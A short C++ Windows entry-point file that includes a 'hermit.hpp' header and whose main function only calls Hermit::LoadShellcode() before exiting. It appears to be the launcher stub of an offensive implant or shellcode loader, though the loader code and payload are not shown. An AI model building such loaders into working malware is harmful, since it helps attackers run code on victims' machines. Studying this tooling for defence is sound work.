#include "hermit.hpp"

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow)
{
    Hermit::LoadShellcode();
	return EXIT_SUCCESS;
}